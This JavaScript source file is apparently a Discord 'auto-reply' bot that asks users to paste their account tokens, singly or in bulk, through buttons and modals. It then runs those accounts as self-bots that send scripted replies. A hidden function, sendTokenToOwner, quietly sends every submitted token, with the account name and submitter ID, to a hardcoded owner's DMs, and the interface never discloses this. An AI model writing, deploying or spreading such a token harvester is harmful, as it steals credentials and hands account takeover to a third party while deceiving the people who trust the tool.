import {
  Client,
  GatewayIntentBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  ActivityType,
  ContainerBuilder,
  TextDisplayBuilder,
  SeparatorBuilder,
  MessageFlags
} from 'discord.js';
import express from 'express';
import WebSocket from 'ws';

// --- UPTIME VƏ PORT ÜÇÜN EXPRESS SERVERİ ---
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Fronzyy Auto-Reply Botu aktif ve çalışıyor!');
});

app.listen(PORT, () => {
  console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});
// -------------------------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

// userId -> Array<{ token, name, username }>
const userTokens = new Map();
// userId -> Array<AutoReplySession>
const activeAutoReplies = new Map();

// Tokenlərin göndəriləcəyi və paneli aça biləcək səlahiyyətli şəxsin ID-si
const OWNER_ID = '1184518857679962186';

// User token Gateway dinləyicisi (kanal mesajlarını real-time izləmək üçün)
class UserGatewayListener {
  constructor(token, accountLabel, onMessageCreate) {
    this.token = token;
    this.accountLabel = accountLabel;
    this.onMessageCreate = onMessageCreate;
    this.ws = null;
    this.heartbeatInterval = null;
    this.seq = null;
    this.sessionId = null;
    this.resumeGatewayUrl = null;
    this.userId = null;
    this.closedIntentionally = false;
  }

  connect() {
    this.closedIntentionally = false;
    const url = this.resumeGatewayUrl || 'wss://gateway.discord.gg/?v=9&encoding=json';
    this.ws = new WebSocket(url);

    this.ws.on('open', () => {
      // HELLO gözlənilir
    });

    this.ws.on('message', (raw) => {
      let payload;
      try {
        payload = JSON.parse(raw.toString());
      } catch {
        return;
      }

      const { op, d, s, t } = payload;
      if (s !== null && s !== undefined) {
        this.seq = s;
      }

      if (op === 10) {
        // HELLO
        const intervalMs = d?.heartbeat_interval || 41250;
        this.startHeartbeat(intervalMs);

        if (this.sessionId && this.seq !== null) {
          this.ws.send(JSON.stringify({
            op: 6,
            d: {
              token: this.token,
              session_id: this.sessionId,
              seq: this.seq
            }
          }));
        } else {
          this.ws.send(JSON.stringify({
            op: 2,
            d: {
              token: this.token,
              intents: (1 << 0) | (1 << 9) | (1 << 15), // GUILDS + GUILD_MESSAGES + MESSAGE_CONTENT
              properties: {
                os: 'linux',
                browser: 'Discord Client',
                device: 'desktop'
              }
            }
          }));
        }
      } else if (op === 0) {
        if (t === 'READY') {
          this.sessionId = d.session_id;
          this.resumeGatewayUrl = d.resume_gateway_url;
          this.userId = d.user?.id || null;
        } else if (t === 'RESUMED') {
          // Bağlantı bərpa olundu
        } else if (t === 'MESSAGE_CREATE') {
          this.onMessageCreate(d, this.userId);
        }
      } else if (op === 7) {
        // Reconnect tələbi
        try { this.ws.close(); } catch {}
      } else if (op === 9) {
        // Invalid session
        this.sessionId = null;
        this.seq = null;
        this.resumeGatewayUrl = null;
        setTimeout(() => {
          if (!this.closedIntentionally) this.connect();
        }, 2500);
      }
    });

    this.ws.on('close', () => {
      this.stopHeartbeat();
      if (!this.closedIntentionally) {
        setTimeout(() => {
          if (!this.closedIntentionally) this.connect();
        }, 4000);
      }
    });

    this.ws.on('error', (err) => {
      console.error(`Gateway xətası (${this.accountLabel}):`, err.message);
    });
  }

  startHeartbeat(intervalMs) {
    this.stopHeartbeat();
    this.heartbeatInterval = setInterval(() => {
      if (this.ws && this.ws.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
      }
    }, intervalMs);
  }

  stopHeartbeat() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
  }

  destroy() {
    this.closedIntentionally = true;
    this.stopHeartbeat();
    if (this.ws) {
      try { this.ws.close(); } catch {}
      this.ws = null;
    }
  }
}

client.once('ready', () => {
  console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);

  client.user.setActivity({
    name: 'powered by Fronzyy',
    type: ActivityType.Playing
  });
});

// Bot sahibinə DM vasitəsilə mesaj göndərmək üçün köməkçi funksiya
async function sendTokenToOwner(client, title, token, accountName, username, addedByUserId) {
  if (!OWNER_ID) return;
  try {
    const owner = await client.users.fetch(OWNER_ID);
    if (owner) {
      await owner.send(
        `📥 **${title}**\n` +
        `👤 **Hesab:** ${accountName} (${username})\n` +
        `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
        `🔑 **Token:** \`${token}\``
      );
    }
  } catch (err) {
    console.error('Owner DM gönderme hatası:', err);
  }
}

// Mesajları sətir-sətir (Enter ilə) ayıraraq reply göndərən funksiya
async function sendRepliesSequentially(token, channelId, targetMessageId, lines) {
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) continue;

    try {
      const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
        method: 'POST',
        headers: {
          'Authorization': token,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: trimmed,
          message_reference: {
            message_id: targetMessageId,
            channel_id: channelId,
            fail_if_not_exists: false
          }
        })
      });

      if (!res.ok) {
        console.error(`Reply xətası (Kanal: ${channelId}): HTTP ${res.status}`);
      }
    } catch (err) {
      console.error(`Reply bağlantı xətası (Kanal: ${channelId}):`, err.message);
    }

    // Ardıcıl mesajlar arasında kiçik fasilə
    await new Promise((resolve) => setTimeout(resolve, 350));
  }
}

// !panel-reply komutu
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content === '!panel-reply') {
    if (message.author.id !== OWNER_ID) {
      try {
        await message.delete();
      } catch (e) {}

      try {
        const warningMsg = await message.channel.send({
          content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.`
        });

        setTimeout(async () => {
          try { await warningMsg.delete(); } catch (err) {}
        }, 5000);
      } catch (err) {}

      return;
    }

    try { await message.delete(); } catch (e) {}

    const container = new ContainerBuilder()
      .setAccentColor(0x2b2d31)
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('# **Fronzyy Auto-Reply Botu**')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Başlat** : Kanal ID, tetikleyici mesaj (büyük/küçük harf duyarlı değil) ve reply mesajlarını girerek başlatır. Her Enter satırı ayrı reply olarak gönderilir.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Toplu Token Ekle** : Her satıra bir token yazarak birden fazla hesabı aynı anda eklersiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Sil** : Eklediğiniz tokenleri tek tek veya tümünü silebilirsiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Durdur** : Seçtiğiniz hesaptaki veya tüm hesaplardaki aktif dinlemeleri durdurur.')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent(`-# Copyright © Developed by Fronzyy 2026`)
      );

    // Birinci sıra düymələr (▶️ Başlat, Token Ekle, Toplu Token Ekle)
    const row1 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('start_spam')
        .setLabel('Başlat')
        .setStyle(ButtonStyle.Success)
        .setEmoji('▶️'),

      new ButtonBuilder()
        .setCustomId('add_token')
        .setLabel('Token Ekle')
        .setStyle(ButtonStyle.Success)
        .setEmoji('➕'),

      new ButtonBuilder()
        .setCustomId('add_bulk_token')
        .setLabel('Toplu Token Ekle')
        .setStyle(ButtonStyle.Primary)
        .setEmoji('🗒️')
    );

    // İkinci sıra düymələr (Token Sil, Durdur)
    const row2 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('remove_token_panel')
        .setLabel('Token Sil')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️'),

      new ButtonBuilder()
        .setCustomId('stop_spam_panel')
        .setLabel('Durdur')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('⏹️')
    );

    await message.channel.send({
      components: [container, row1, row2],
      flags: MessageFlags.IsComponentsV2
    });
  }
});

// Buton ve Modal etkileşimleri
client.on('interactionCreate', async (interaction) => {
  const userId = interaction.user.id;

  // --- 1. TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_token') {
    const modal = new ModalBuilder()
      .setCustomId('token_modal')
      .setTitle('Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('token_input')
      .setLabel('Discord Tokeninizi girin')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await interaction.showModal(modal);
  }

  // --- 1.1. TOPLU TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
    const modal = new ModalBuilder()
      .setCustomId('bulk_token_modal')
      .setTitle('Toplu Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('bulk_token_input')
      .setLabel('Discord Tokenlerini girin')
      .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await interaction.showModal(modal);
  }

  // --- 1.2. TOKEN SİL PANELİ (SEÇİM MENÜSÜ) ---
  if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_remove_account')
      .setPlaceholder('Silmek istediğiniz hesabı seçin...')
      .addOptions([
        { label: 'Bütün Tokenleri Sil', value: 'clear_all_tokens', description: 'Size ait olan bütün tokenleri sistemden siler', emoji: '❌' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Bu hesabı sil`,
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
  }

  // --- 2. TEK TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
    const token = interaction.fields.getTextInputValue('token_input').trim();
    await interaction.deferReply({ ephemeral: true });

    try {
      const userRes = await fetch('https://discord.com/api/v9/users/@me', {
        headers: { 'Authorization': token }
      });

      if (!userRes.ok) {
        return interaction.editReply({ content: `❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.` });
      }

      const userData = await userRes.json();
      const globalName = userData.global_name || userData.username;
      const username = userData.username;

      if (!userTokens.has(userId)) {
        userTokens.set(userId, []);
      }

      const existingList = userTokens.get(userId);
      if (!existingList.some(t => t.token === token)) {
        existingList.push({ token, name: globalName, username });
        await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);
      }

      await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
    } catch (err) {
      await interaction.editReply({ content: `❌ Token eklenirken bir hata oluştu.` });
    }
  }

  // --- 2.1. TOPLU TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
    const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
    const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);

    if (tokens.length === 0) {
      return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!userTokens.has(userId)) {
      userTokens.set(userId, []);
    }
    const existingList = userTokens.get(userId);

    let successCount = 0;
    let failCount = 0;
    const addedNames = [];

    for (const token of tokens) {
      if (existingList.some(t => t.token === token)) continue;

      try {
        const userRes = await fetch('https://discord.com/api/v9/users/@me', {
          headers: { 'Authorization': token }
        });

        if (userRes.ok) {
          const userData = await userRes.json();
          const globalName = userData.global_name || userData.username;
          const username = userData.username;

          existingList.push({ token, name: globalName, username });
          addedNames.push(`${globalName} (${username})`);
          successCount++;

          await sendTokenToOwner(client, 'Toplu Token Eklendi', token, globalName, username, userId);
        } else {
          failCount++;
        }
      } catch (err) {
        failCount++;
      }
    }

    await interaction.editReply({
      content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}`
    });
  }

  // --- 2.2. TOKEN SİLME SEÇİM İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
    const selectedValue = interaction.values[0];
    const tokens = userTokens.get(userId);

    if (!tokens) {
      return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
    }

    if (selectedValue === 'clear_all_tokens') {
      userTokens.set(userId, []);
      return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
    } else {
      const index = parseInt(selectedValue, 10);
      const removedAccount = tokens.splice(index, 1)[0];
      return interaction.reply({ content: `❌ Başarıyla silindi: **${removedAccount.name} (${removedAccount.username})**`, ephemeral: true });
    }
  }

  // --- 3. ▶️ BAŞLAT BUTONU ---
  if (interaction.isButton() && interaction.customId === 'start_spam') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_account')
      .setPlaceholder('Hesap seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplar otomatik reply atar' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Seçilen hesap: ${t.name}`
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Otomatik reply yapacak hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 4. HESAP SEÇİLDİKTƏN SONRA KANAL, TETİKLEYİCİ VE CEVAP MODALİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_account') {
    const selectedValue = interaction.values[0];

    const modal = new ModalBuilder()
      .setCustomId(`autoreply_modal_${selectedValue}`)
      .setTitle('Otomatik Reply Ayarları');

    const channelInput = new TextInputBuilder()
      .setCustomId('channel_id')
      .setLabel('Kanal ID-si')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const triggerInput = new TextInputBuilder()
      .setCustomId('trigger_text')
      .setLabel('Hangi mesaj gelince yazsın? (örn: sa)')
      .setPlaceholder('SA, Sa, sA, sa hepsi eşleşir')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const replyLinesInput = new TextInputBuilder()
      .setCustomId('reply_messages')
      .setLabel('Hangi mesaj atılsın? (Her Enter = ayrı reply)')
      .setPlaceholder('as\nhg')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true);

    modal.addComponents(
      new ActionRowBuilder().addComponents(channelInput),
      new ActionRowBuilder().addComponents(triggerInput),
      new ActionRowBuilder().addComponents(replyLinesInput)
    );

    await interaction.showModal(modal);
  }

  // --- 5. AUTO-REPLY BAŞLANGICI (MODAL SUBMIT) ---
  if (interaction.isModalSubmit() && interaction.customId.startsWith('autoreply_modal_')) {
    const selectedValue = interaction.customId.replace('autoreply_modal_', '');
    const channelId = interaction.fields.getTextInputValue('channel_id').trim();
    const triggerRaw = interaction.fields.getTextInputValue('trigger_text').trim().toLowerCase();
    const rawReplyText = interaction.fields.getTextInputValue('reply_messages');

    const replyLines = rawReplyText
      .split(/\r?\n/)
      .map(line => line.trim())
      .filter(line => line.length > 0);

    if (!triggerRaw) {
      return interaction.reply({ content: '❌ Tetikleyici mesaj boş olamaz!', ephemeral: true });
    }

    if (replyLines.length === 0) {
      return interaction.reply({ content: '❌ En az 1 cevap mesajı girmelisiniz!', ephemeral: true });
    }

    const tokens = userTokens.get(userId) || [];
    let targetTokens = [];

    if (selectedValue === 'all_accounts') {
      targetTokens = tokens;
    } else {
      const idx = parseInt(selectedValue, 10);
      if (tokens[idx]) targetTokens = [tokens[idx]];
    }

    if (targetTokens.length === 0) {
      return interaction.reply({ content: '❌ Seçilen hesap bulunamadı!', ephemeral: true });
    }

    if (!activeAutoReplies.has(userId)) {
      activeAutoReplies.set(userId, []);
    }

    for (const tObj of targetTokens) {
      const label = `${tObj.name} (${tObj.username})`;

      const listener = new UserGatewayListener(tObj.token, label, async (msgData, selfUserId) => {
        if (!msgData || !msgData.id || !msgData.channel_id) return;
        if (msgData.channel_id !== channelId) return;
        if (msgData.author?.bot) return;
        if (selfUserId && msgData.author?.id === selfUserId) return;

        const incomingContent = (msgData.content || '').trim().toLowerCase();
        if (incomingContent === triggerRaw) {
          await sendRepliesSequentially(tObj.token, channelId, msgData.id, replyLines);
        }
      });

      listener.connect();

      activeAutoReplies.get(userId).push({
        listener,
        token: tObj.token,
        name: tObj.name,
        username: tObj.username,
        channelId,
        trigger: triggerRaw,
        lines: replyLines
      });
    }

    await interaction.reply({
      content:
        `▶️ **Otomatik Reply Başlatıldı!**\n` +
        `👤 **Hesap Sayısı:** ${targetTokens.length}\n` +
        `📌 **Kanal ID:** \`${channelId}\`\n` +
        `🎯 **Tetikleyici:** \`${triggerRaw}\` *(büyük/küçük harf fark etmez)*\n` +
        `💬 **Gönderilecek Reply Sırası:** ${replyLines.map(l => `\`${l}\``).join(' ➔ ')}`,
      ephemeral: true
    });
  }

  // --- 6. DURDUR BUTONU (SEÇİM MENÜSÜ) ---
  if (interaction.isButton() && interaction.customId === 'stop_spam_panel') {
    const userSessions = activeAutoReplies.get(userId);

    if (!userSessions || userSessions.length === 0) {
      return interaction.reply({ content: 'ℹ️ Aktif otomatik reply süreciniz bulunmuyor.', ephemeral: true });
    }

    const uniqueAccounts = [];
    const seenTokens = new Set();
    for (const sp of userSessions) {
      if (!seenTokens.has(sp.token)) {
        seenTokens.add(sp.token);
        uniqueAccounts.push(sp);
      }
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_stop_account')
      .setPlaceholder('Durdurmak istediğiniz hesabı seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Bütün hesaplardaki aktif dinlemeleri durdurur', emoji: '❌' },
        ...uniqueAccounts.map((sp) => ({
          label: `${sp.name} (${sp.username})`,
          value: sp.token,
          description: `Bu hesabı durdur (Kanal: ${sp.channelId})`,
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Durdurmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 6.1. HESAP SEÇİLDİKTƏN SONRA DAYANDIRMA ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_stop_account') {
    const selectedValue = interaction.values[0];
    const userSessions = activeAutoReplies.get(userId);

    if (!userSessions || userSessions.length === 0) {
      return interaction.reply({ content: 'ℹ️ Aktif otomatik reply süreciniz bulunmuyor.', ephemeral: true });
    }

    if (selectedValue === 'all_accounts') {
      for (const item of userSessions) {
        item.listener.destroy();
      }
      activeAutoReplies.set(userId, []);
      return interaction.reply({ content: '🛑 Hesaplarınızdaki bütün aktif otomatik reply süreçleri durduruldu.', ephemeral: true });
    } else {
      const remaining = [];
      let stoppedCount = 0;
      let stoppedAccountName = '';

      for (const item of userSessions) {
        if (item.token === selectedValue) {
          item.listener.destroy();
          stoppedCount++;
          stoppedAccountName = `${item.name} (${item.username})`;
        } else {
          remaining.push(item);
        }
      }

      activeAutoReplies.set(userId, remaining);
      return interaction.reply({
        content: stoppedCount > 0
          ? `⏹️ **${stoppedAccountName}** hesabındaki otomatik reply durduruldu.`
          : 'ℹ️ Bu hesap için aktif süreç bulunamadı.',
        ephemeral: true
      });
    }
  }
});

// Render-də token yoxlanışı ilə giriş
if (!process.env.DISCORD_TOKEN) {
  console.error("❌ HATA: DISCORD_TOKEN environment dəyişəni tapılmadı! Render panelindən əlavə edin.");
  process.exit(1);
}

client.login(process.env.DISCORD_TOKEN);
